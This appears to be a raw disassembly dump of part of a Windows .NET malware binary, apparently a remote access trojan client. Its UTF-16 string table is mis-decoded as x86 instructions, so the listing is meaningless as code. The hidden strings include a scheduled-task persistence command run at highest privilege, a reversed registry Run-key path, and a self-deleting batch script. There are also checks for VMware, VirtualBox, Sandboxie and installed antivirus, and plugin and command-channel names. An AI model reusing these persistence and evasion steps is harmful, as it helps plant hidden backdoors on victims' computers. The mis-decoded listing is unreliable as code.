  40b6e6:	00 78 00             	add    %bh,0x0(%eax)
  40b6e9:	4d                   	dec    %ebp
  40b6ea:	00 48 00             	add    %cl,0x0(%eax)
  40b6ed:	35 00 32 00 67       	xor    $0x67003200,%eax
  40b6f2:	00 2b                	add    %ch,(%ebx)
  40b6f4:	00 41 00             	add    %al,0x0(%ecx)
  40b6f7:	61                   	popa
  40b6f8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b6fb:	51                   	push   %ecx
  40b6fc:	00 2b                	add    %ch,(%ebx)
  40b6fe:	00 69 00             	add    %ch,0x0(%ecx)
  40b701:	72 00                	jb     0x40b703
  40b703:	34 00                	xor    $0x0,%al
  40b705:	67 00 55 00          	add    %dl,0x0(%di)
  40b709:	6f                   	outsl  %ds:(%esi),(%dx)
  40b70a:	00 72 00             	add    %dh,0x0(%edx)
  40b70d:	45                   	inc    %ebp
  40b70e:	00 6f 00             	add    %ch,0x0(%edi)
  40b711:	70 00                	jo     0x40b713
  40b713:	66 00 38             	data16 add %bh,(%eax)
  40b716:	00 58 00             	add    %bl,0x0(%eax)
  40b719:	33 00                	xor    (%eax),%eax
  40b71b:	51                   	push   %ecx
  40b71c:	00 57 00             	add    %dl,0x0(%edi)
  40b71f:	33 00                	xor    (%eax),%eax
  40b721:	63 00                	arpl   %eax,(%eax)
  40b723:	55                   	push   %ebp
  40b724:	00 30                	add    %dh,(%eax)
  40b726:	00 33                	add    %dh,(%ebx)
  40b728:	00 49 00             	add    %cl,0x0(%ecx)
  40b72b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b72c:	00 77 00             	add    %dh,0x0(%edi)
  40b72f:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b734:	09 6e 00             	or     %ebp,0x0(%esi)
  40b737:	75 00                	jne    0x40b739
  40b739:	6c                   	insb   (%dx),%es:(%edi)
  40b73a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b73e:	03 3a                	add    (%edx),%edi
  40b740:	00 00                	add    %al,(%eax)
  40b742:	0d 50 00 61 00       	or     $0x610050,%eax
  40b747:	63 00                	arpl   %eax,(%eax)
  40b749:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b74c:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b750:	09 50 00             	or     %edx,0x0(%eax)
  40b753:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b759:	00 0f                	add    %cl,(%edi)
  40b75b:	4d                   	dec    %ebp
  40b75c:	00 65 00             	add    %ah,0x0(%ebp)
  40b75f:	73 00                	jae    0x40b761
  40b761:	73 00                	jae    0x40b763
  40b763:	61                   	popa
  40b764:	00 67 00             	add    %ah,0x0(%edi)
  40b767:	65 00 00             	add    %al,%gs:(%eax)
  40b76a:	07                   	pop    %es
  40b76b:	63 00                	arpl   %eax,(%eax)
  40b76d:	6d                   	insl   (%dx),%es:(%edi)
  40b76e:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b772:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b778:	00 73 00             	add    %dh,0x0(%ebx)
  40b77b:	63 00                	arpl   %eax,(%eax)
  40b77d:	68 00 74 00 61       	push   $0x61007400
  40b782:	00 73 00             	add    %dh,0x0(%ebx)
  40b785:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b788:	00 20                	add    %ah,(%eax)
  40b78a:	00 2f                	add    %ch,(%edi)
  40b78c:	00 63 00             	add    %ah,0x0(%ebx)
  40b78f:	72 00                	jb     0x40b791
  40b791:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b795:	74 00                	je     0x40b797
  40b797:	65 00 20             	add    %ah,%gs:(%eax)
  40b79a:	00 2f                	add    %ch,(%edi)
  40b79c:	00 66 00             	add    %ah,0x0(%esi)
  40b79f:	20 00                	and    %al,(%eax)
  40b7a1:	2f                   	das
  40b7a2:	00 73 00             	add    %dh,0x0(%ebx)
  40b7a5:	63 00                	arpl   %eax,(%eax)
  40b7a7:	20 00                	and    %al,(%eax)
  40b7a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7aa:	00 6e 00             	add    %ch,0x0(%esi)
  40b7ad:	6c                   	insb   (%dx),%es:(%edi)
  40b7ae:	00 6f 00             	add    %ch,0x0(%edi)
  40b7b1:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b7b5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7b6:	00 20                	add    %ah,(%eax)
  40b7b8:	00 2f                	add    %ch,(%edi)
  40b7ba:	00 72 00             	add    %dh,0x0(%edx)
  40b7bd:	6c                   	insb   (%dx),%es:(%edi)
  40b7be:	00 20                	add    %ah,(%eax)
  40b7c0:	00 68 00             	add    %ch,0x0(%eax)
  40b7c3:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b7c9:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b7cd:	74 00                	je     0x40b7cf
  40b7cf:	20 00                	and    %al,(%eax)
  40b7d1:	2f                   	das
  40b7d2:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b7d6:	00 20                	add    %ah,(%eax)
  40b7d8:	00 22                	add    %ah,(%edx)
  40b7da:	00 00                	add    %al,(%eax)
  40b7dc:	11 22                	adc    %esp,(%edx)
  40b7de:	00 20                	add    %ah,(%eax)
  40b7e0:	00 2f                	add    %ch,(%edi)
  40b7e2:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b7e6:	00 20                	add    %ah,(%eax)
  40b7e8:	00 27                	add    %ah,(%edi)
  40b7ea:	00 22                	add    %ah,(%edx)
  40b7ec:	00 01                	add    %al,(%ecx)
  40b7ee:	13 22                	adc    (%edx),%esp
  40b7f0:	00 27                	add    %ah,(%edi)
  40b7f2:	00 20                	add    %ah,(%eax)
  40b7f4:	00 26                	add    %ah,(%esi)
  40b7f6:	00 20                	add    %ah,(%eax)
  40b7f8:	00 65 00             	add    %ah,0x0(%ebp)
  40b7fb:	78 00                	js     0x40b7fd
  40b7fd:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b803:	5c                   	pop    %esp
  40b804:	00 6e 00             	add    %ch,0x0(%esi)
  40b807:	75 00                	jne    0x40b809
  40b809:	52                   	push   %edx
  40b80a:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b80e:	00 6f 00             	add    %ch,0x0(%edi)
  40b811:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b817:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b81b:	74 00                	je     0x40b81d
  40b81d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b81e:	00 65 00             	add    %ah,0x0(%ebp)
  40b821:	72 00                	jb     0x40b823
  40b823:	72 00                	jb     0x40b825
  40b825:	75 00                	jne    0x40b827
  40b827:	43                   	inc    %ebx
  40b828:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b82c:	00 77 00             	add    %dh,0x0(%edi)
  40b82f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b830:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b834:	00 69 00             	add    %ch,0x0(%ecx)
  40b837:	57                   	push   %edi
  40b838:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b83c:	00 66 00             	add    %ah,0x0(%esi)
  40b83f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b840:	00 73 00             	add    %dh,0x0(%ebx)
  40b843:	6f                   	outsl  %ds:(%esi),(%dx)
  40b844:	00 72 00             	add    %dh,0x0(%edx)
  40b847:	63 00                	arpl   %eax,(%eax)
  40b849:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b84f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b853:	61                   	popa
  40b854:	00 77 00             	add    %dh,0x0(%edi)
  40b857:	74 00                	je     0x40b859
  40b859:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b85d:	53                   	push   %ebx
  40b85e:	00 00                	add    %al,(%eax)
  40b860:	03 22                	add    (%edx),%esp
  40b862:	00 00                	add    %al,(%eax)
  40b864:	09 2e                	or     %ebp,(%esi)
  40b866:	00 62 00             	add    %ah,0x0(%edx)
  40b869:	61                   	popa
  40b86a:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b86e:	13 40 00             	adc    0x0(%eax),%eax
  40b871:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b875:	68 00 6f 00 20       	push   $0x20006f00
  40b87a:	00 6f 00             	add    %ch,0x0(%edi)
  40b87d:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b881:	00 1f                	add    %bl,(%edi)
  40b883:	74 00                	je     0x40b885
  40b885:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b88b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b88c:	00 75 00             	add    %dh,0x0(%ebp)
  40b88f:	74 00                	je     0x40b891
  40b891:	20 00                	and    %al,(%eax)
  40b893:	33 00                	xor    (%eax),%eax
  40b895:	20 00                	and    %al,(%eax)
  40b897:	3e 00 20             	add    %ah,%ds:(%eax)
  40b89a:	00 4e 00             	add    %cl,0x0(%esi)
  40b89d:	55                   	push   %ebp
  40b89e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b8a2:	15 53 00 54 00       	adc    $0x540053,%eax
  40b8a7:	41                   	inc    %ecx
  40b8a8:	00 52 00             	add    %dl,0x0(%edx)
  40b8ab:	54                   	push   %esp
  40b8ac:	00 20                	add    %ah,(%eax)
  40b8ae:	00 22                	add    %ah,(%edx)
  40b8b0:	00 22                	add    %ah,(%edx)
  40b8b2:	00 20                	add    %ah,(%eax)
  40b8b4:	00 22                	add    %ah,(%edx)
  40b8b6:	00 00                	add    %al,(%eax)
  40b8b8:	07                   	pop    %es
  40b8b9:	43                   	inc    %ebx
  40b8ba:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b8be:	00 00                	add    %al,(%eax)
  40b8c0:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b8c4:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b8c8:	00 22                	add    %ah,(%edx)
  40b8ca:	00 00                	add    %al,(%eax)
  40b8cc:	0f 22 00             	mov    %eax,%cr0
  40b8cf:	20 00                	and    %al,(%eax)
  40b8d1:	2f                   	das
  40b8d2:	00 66 00             	add    %ah,0x0(%esi)
  40b8d5:	20 00                	and    %al,(%eax)
  40b8d7:	2f                   	das
  40b8d8:	00 71 00             	add    %dh,0x0(%ecx)
  40b8db:	00 05 78 00 70 00    	add    %al,0x700078
  40b8e1:	00 45 53             	add    %al,0x53(%ebp)
  40b8e4:	00 65 00             	add    %ah,0x0(%ebp)
  40b8e7:	6c                   	insb   (%dx),%es:(%edi)
  40b8e8:	00 65 00             	add    %ah,0x0(%ebp)
  40b8eb:	63 00                	arpl   %eax,(%eax)
  40b8ed:	74 00                	je     0x40b8ef
  40b8ef:	20 00                	and    %al,(%eax)
  40b8f1:	2a 00                	sub    (%eax),%al
  40b8f3:	20 00                	and    %al,(%eax)
  40b8f5:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b8f9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40b8fd:	20 00                	and    %al,(%eax)
  40b8ff:	57                   	push   %edi
  40b900:	00 69 00             	add    %ch,0x0(%ecx)
  40b903:	6e                   	outsb  %ds:(%esi),(%dx)
  40b904:	00 33                	add    %dh,(%ebx)
  40b906:	00 32                	add    %dh,(%edx)
  40b908:	00 5f 00             	add    %bl,0x0(%edi)
  40b90b:	43                   	inc    %ebx
  40b90c:	00 6f 00             	add    %ch,0x0(%edi)
  40b90f:	6d                   	insl   (%dx),%es:(%edi)
  40b910:	00 70 00             	add    %dh,0x0(%eax)
  40b913:	75 00                	jne    0x40b915
  40b915:	74 00                	je     0x40b917
  40b917:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b91b:	53                   	push   %ebx
  40b91c:	00 79 00             	add    %bh,0x0(%ecx)
  40b91f:	73 00                	jae    0x40b921
  40b921:	74 00                	je     0x40b923
  40b923:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b927:	00 19                	add    %bl,(%ecx)
  40b929:	4d                   	dec    %ebp
  40b92a:	00 61 00             	add    %ah,0x0(%ecx)
  40b92d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b92e:	00 75 00             	add    %dh,0x0(%ebp)
  40b931:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b935:	63 00                	arpl   %eax,(%eax)
  40b937:	74 00                	je     0x40b939
  40b939:	75 00                	jne    0x40b93b
  40b93b:	72 00                	jb     0x40b93d
  40b93d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b941:	00 2b                	add    %ch,(%ebx)
  40b943:	6d                   	insl   (%dx),%es:(%edi)
  40b944:	00 69 00             	add    %ch,0x0(%ecx)
  40b947:	63 00                	arpl   %eax,(%eax)
  40b949:	72 00                	jb     0x40b94b
  40b94b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b94c:	00 73 00             	add    %dh,0x0(%ebx)
  40b94f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b950:	00 66 00             	add    %ah,0x0(%esi)
  40b953:	74 00                	je     0x40b955
  40b955:	20 00                	and    %al,(%eax)
  40b957:	63 00                	arpl   %eax,(%eax)
  40b959:	6f                   	outsl  %ds:(%esi),(%dx)
  40b95a:	00 72 00             	add    %dh,0x0(%edx)
  40b95d:	70 00                	jo     0x40b95f
  40b95f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b960:	00 72 00             	add    %dh,0x0(%edx)
  40b963:	61                   	popa
  40b964:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b968:	00 6f 00             	add    %ch,0x0(%edi)
  40b96b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b96c:	00 00                	add    %al,(%eax)
  40b96e:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b971:	6f                   	outsl  %ds:(%esi),(%dx)
  40b972:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b976:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b97a:	0f 56 00             	orps   (%eax),%xmm0
  40b97d:	49                   	dec    %ecx
  40b97e:	00 52 00             	add    %dl,0x0(%edx)
  40b981:	54                   	push   %esp
  40b982:	00 55 00             	add    %dl,0x0(%ebp)
  40b985:	41                   	inc    %ecx
  40b986:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b98a:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b98f:	77 00                	ja     0x40b991
  40b991:	61                   	popa
  40b992:	00 72 00             	add    %dh,0x0(%edx)
  40b995:	65 00 00             	add    %al,%gs:(%eax)
  40b998:	15 56 00 69 00       	adc    $0x690056,%eax
  40b99d:	72 00                	jb     0x40b99f
  40b99f:	74 00                	je     0x40b9a1
  40b9a1:	75 00                	jne    0x40b9a3
  40b9a3:	61                   	popa
  40b9a4:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b9a8:	00 6f 00             	add    %ch,0x0(%edi)
  40b9ab:	78 00                	js     0x40b9ad
  40b9ad:	00 17                	add    %dl,(%edi)
  40b9af:	53                   	push   %ebx
  40b9b0:	00 62 00             	add    %ah,0x0(%edx)
  40b9b3:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b9b9:	6c                   	insb   (%dx),%es:(%edi)
  40b9ba:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b9be:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b9c2:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b9c6:	11 45 00             	adc    %eax,0x0(%ebp)
  40b9c9:	72 00                	jb     0x40b9cb
  40b9cb:	72 00                	jb     0x40b9cd
  40b9cd:	20 00                	and    %al,(%eax)
  40b9cf:	48                   	dec    %eax
  40b9d0:	00 57 00             	add    %dl,0x0(%edi)
  40b9d3:	49                   	dec    %ecx
  40b9d4:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9d8:	05 78 00 32 00       	add    $0x320078,%eax
  40b9dd:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b9e3:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b9e9:	74 00                	je     0x40b9eb
  40b9eb:	49                   	dec    %ecx
  40b9ec:	00 6e 00             	add    %ch,0x0(%esi)
  40b9ef:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b9f3:	00 09                	add    %cl,(%ecx)
  40b9f5:	48                   	dec    %eax
  40b9f6:	00 57 00             	add    %dl,0x0(%edi)
  40b9f9:	49                   	dec    %ecx
  40b9fa:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9fe:	09 55 00             	or     %edx,0x0(%ebp)
  40ba01:	73 00                	jae    0x40ba03
  40ba03:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba07:	00 05 4f 00 53 00    	add    %al,0x53004f
  40ba0d:	00 13                	add    %dl,(%ebx)
  40ba0f:	4d                   	dec    %ebp
  40ba10:	00 69 00             	add    %ch,0x0(%ecx)
  40ba13:	63 00                	arpl   %eax,(%eax)
  40ba15:	72 00                	jb     0x40ba17
  40ba17:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba18:	00 73 00             	add    %dh,0x0(%ebx)
  40ba1b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba1c:	00 66 00             	add    %ah,0x0(%esi)
  40ba1f:	74 00                	je     0x40ba21
  40ba21:	00 03                	add    %al,(%ebx)
  40ba23:	20 00                	and    %al,(%eax)
  40ba25:	00 09                	add    %cl,(%ecx)
  40ba27:	54                   	push   %esp
  40ba28:	00 72 00             	add    %dh,0x0(%edx)
  40ba2b:	75 00                	jne    0x40ba2d
  40ba2d:	65 00 00             	add    %al,%gs:(%eax)
  40ba30:	0b 36                	or     (%esi),%esi
  40ba32:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba35:	62 00                	bound  %eax,(%eax)
  40ba37:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40ba3d:	46                   	inc    %esi
  40ba3e:	00 61 00             	add    %ah,0x0(%ecx)
  40ba41:	6c                   	insb   (%dx),%es:(%edi)
  40ba42:	00 73 00             	add    %dh,0x0(%ebx)
  40ba45:	65 00 00             	add    %al,%gs:(%eax)
  40ba48:	0b 33                	or     (%ebx),%esi
  40ba4a:	00 32                	add    %dh,(%edx)
  40ba4c:	00 62 00             	add    %ah,0x0(%edx)
  40ba4f:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40ba55:	50                   	push   %eax
  40ba56:	00 61 00             	add    %ah,0x0(%ecx)
  40ba59:	74 00                	je     0x40ba5b
  40ba5b:	68 00 00 0f 56       	push   $0x560f0000
  40ba60:	00 65 00             	add    %ah,0x0(%ebp)
  40ba63:	72 00                	jb     0x40ba65
  40ba65:	73 00                	jae    0x40ba67
  40ba67:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba6d:	00 0b                	add    %cl,(%ebx)
  40ba6f:	41                   	inc    %ecx
  40ba70:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ba74:	00 69 00             	add    %ch,0x0(%ecx)
  40ba77:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba78:	00 00                	add    %al,(%eax)
  40ba7a:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40ba7e:	00 75 00             	add    %dh,0x0(%ebp)
  40ba81:	65 00 00             	add    %al,%gs:(%eax)
  40ba84:	0b 66 00             	or     0x0(%esi),%esp
  40ba87:	61                   	popa
  40ba88:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40ba8c:	00 65 00             	add    %ah,0x0(%ebp)
  40ba8f:	00 17                	add    %dl,(%edi)
  40ba91:	50                   	push   %eax
  40ba92:	00 65 00             	add    %ah,0x0(%ebp)
  40ba95:	72 00                	jb     0x40ba97
  40ba97:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba9b:	72 00                	jb     0x40ba9d
  40ba9d:	6d                   	insl   (%dx),%es:(%edi)
  40ba9e:	00 61 00             	add    %ah,0x0(%ecx)
  40baa1:	6e                   	outsb  %ds:(%esi),(%dx)
  40baa2:	00 63 00             	add    %ah,0x0(%ebx)
  40baa5:	65 00 00             	add    %al,%gs:(%eax)
  40baa8:	11 50 00             	adc    %edx,0x0(%eax)
  40baab:	61                   	popa
  40baac:	00 73 00             	add    %dh,0x0(%ebx)
  40baaf:	74 00                	je     0x40bab1
  40bab1:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40bab5:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40babb:	41                   	inc    %ecx
  40babc:	00 6e 00             	add    %ch,0x0(%esi)
  40babf:	74 00                	je     0x40bac1
  40bac1:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bac7:	72 00                	jb     0x40bac9
  40bac9:	75 00                	jne    0x40bacb
  40bacb:	73 00                	jae    0x40bacd
  40bacd:	00 13                	add    %dl,(%ebx)
  40bacf:	49                   	dec    %ecx
  40bad0:	00 6e 00             	add    %ch,0x0(%esi)
  40bad3:	73 00                	jae    0x40bad5
  40bad5:	74 00                	je     0x40bad7
  40bad7:	61                   	popa
  40bad8:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40badc:	00 65 00             	add    %ah,0x0(%ebp)
  40badf:	64 00 00             	add    %al,%fs:(%eax)
  40bae2:	09 50 00             	or     %edx,0x0(%eax)
  40bae5:	6f                   	outsl  %ds:(%esi),(%dx)
  40bae6:	00 6e 00             	add    %ch,0x0(%esi)
  40bae9:	67 00 00             	add    %al,(%bx,%si)
  40baec:	0b 47 00             	or     0x0(%edi),%eax
  40baef:	72 00                	jb     0x40baf1
  40baf1:	6f                   	outsl  %ds:(%esi),(%dx)
  40baf2:	00 75 00             	add    %dh,0x0(%ebp)
  40baf5:	70 00                	jo     0x40baf7
  40baf7:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40bafd:	00 2b                	add    %ch,(%ebx)
  40baff:	5c                   	pop    %esp
  40bb00:	00 72 00             	add    %dh,0x0(%edx)
  40bb03:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb04:	00 6f 00             	add    %ch,0x0(%edi)
  40bb07:	74 00                	je     0x40bb09
  40bb09:	5c                   	pop    %esp
  40bb0a:	00 53 00             	add    %dl,0x0(%ebx)
  40bb0d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bb11:	75 00                	jne    0x40bb13
  40bb13:	72 00                	jb     0x40bb15
  40bb15:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bb1b:	43                   	inc    %ebx
  40bb1c:	00 65 00             	add    %ah,0x0(%ebp)
  40bb1f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb20:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bb24:	00 72 00             	add    %dh,0x0(%edx)
  40bb27:	32 00                	xor    (%eax),%al
  40bb29:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bb2f:	6c                   	insb   (%dx),%es:(%edi)
  40bb30:	00 65 00             	add    %ah,0x0(%ebp)
  40bb33:	63 00                	arpl   %eax,(%eax)
  40bb35:	74 00                	je     0x40bb37
  40bb37:	20 00                	and    %al,(%eax)
  40bb39:	2a 00                	sub    (%eax),%al
  40bb3b:	20 00                	and    %al,(%eax)
  40bb3d:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bb41:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb42:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb45:	20 00                	and    %al,(%eax)
  40bb47:	41                   	inc    %ecx
  40bb48:	00 6e 00             	add    %ch,0x0(%esi)
  40bb4b:	74 00                	je     0x40bb4d
  40bb4d:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb53:	72 00                	jb     0x40bb55
  40bb55:	75 00                	jne    0x40bb57
  40bb57:	73 00                	jae    0x40bb59
  40bb59:	50                   	push   %eax
  40bb5a:	00 72 00             	add    %dh,0x0(%edx)
  40bb5d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb5e:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bb62:	00 63 00             	add    %ah,0x0(%ebx)
  40bb65:	74 00                	je     0x40bb67
  40bb67:	00 17                	add    %dl,(%edi)
  40bb69:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bb6d:	73 00                	jae    0x40bb6f
  40bb6f:	70 00                	jo     0x40bb71
  40bb71:	6c                   	insb   (%dx),%es:(%edi)
  40bb72:	00 61 00             	add    %ah,0x0(%ecx)
  40bb75:	79 00                	jns    0x40bb77
  40bb77:	4e                   	dec    %esi
  40bb78:	00 61 00             	add    %ah,0x0(%ecx)
  40bb7b:	6d                   	insl   (%dx),%es:(%edi)
  40bb7c:	00 65 00             	add    %ah,0x0(%ebp)
  40bb7f:	00 07                	add    %al,(%edi)
  40bb81:	4e                   	dec    %esi
  40bb82:	00 2f                	add    %ch,(%edi)
  40bb84:	00 41 00             	add    %al,0x0(%ecx)
  40bb87:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bb8d:	00 13                	add    %dl,(%ebx)
  40bb8f:	53                   	push   %ebx
  40bb90:	00 6f 00             	add    %ch,0x0(%edi)
  40bb93:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bb98:	00 61 00             	add    %ah,0x0(%ecx)
  40bb9b:	72 00                	jb     0x40bb9d
  40bb9d:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bba2:	09 70 00             	or     %esi,0x0(%eax)
  40bba5:	6f                   	outsl  %ds:(%esi),(%dx)
  40bba6:	00 6e 00             	add    %ch,0x0(%esi)
  40bba9:	67 00 00             	add    %al,(%bx,%si)
  40bbac:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bbb1:	75 00                	jne    0x40bbb3
  40bbb3:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbb7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbb8:	00 00                	add    %al,(%eax)
  40bbba:	15 73 00 61 00       	adc    $0x610073,%eax
  40bbbf:	76 00                	jbe    0x40bbc1
  40bbc1:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bbc5:	6c                   	insb   (%dx),%es:(%edi)
  40bbc6:	00 75 00             	add    %dh,0x0(%ebp)
  40bbc9:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbcd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbce:	00 00                	add    %al,(%eax)
  40bbd0:	07                   	pop    %es
  40bbd1:	44                   	inc    %esp
  40bbd2:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bbd6:	00 00                	add    %al,(%eax)
  40bbd8:	15 73 00 65 00       	adc    $0x650073,%eax
  40bbdd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbde:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bbe2:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbe6:	00 67 00             	add    %ah,0x0(%edi)
  40bbe9:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bbef:	48                   	dec    %eax
  40bbf0:	00 61 00             	add    %ah,0x0(%ecx)
  40bbf3:	73 00                	jae    0x40bbf5
  40bbf5:	68 00 65 00 73       	push   $0x73006500
  40bbfa:	00 00                	add    %al,(%eax)
  40bbfc:	09 48 00             	or     %ecx,0x0(%eax)
  40bbff:	61                   	popa
  40bc00:	00 73 00             	add    %dh,0x0(%ebx)
  40bc03:	68 00 00 1b 50       	push   $0x501b0000
  40bc08:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc0c:	00 67 00             	add    %ah,0x0(%edi)
  40bc0f:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bc15:	50                   	push   %eax
  40bc16:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc1a:	00 67 00             	add    %ah,0x0(%edi)
  40bc1d:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bc23:	52                   	push   %edx
  40bc24:	00 75 00             	add    %dh,0x0(%ebp)
  40bc27:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc28:	00 00                	add    %al,(%eax)
  40bc2a:	0f 4d 00             	cmovge (%eax),%eax
  40bc2d:	73 00                	jae    0x40bc2f
  40bc2f:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bc33:	61                   	popa
  40bc34:	00 63 00             	add    %ah,0x0(%ebx)
  40bc37:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bc3a:	11 52 00             	adc    %edx,0x0(%edx)
  40bc3d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bc41:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bc45:	76 00                	jbe    0x40bc47
  40bc47:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bc4c:	0b 45 00             	or     0x0(%ebp),%eax
  40bc4f:	72 00                	jb     0x40bc51
  40bc51:	72 00                	jb     0x40bc53
  40bc53:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc54:	00 72 00             	add    %dh,0x0(%edx)
  40bc57:	00 47 6d             	add    %al,0x6d(%edi)
  40bc5a:	00 61 00             	add    %ah,0x0(%ecx)
  40bc5d:	73 00                	jae    0x40bc5f
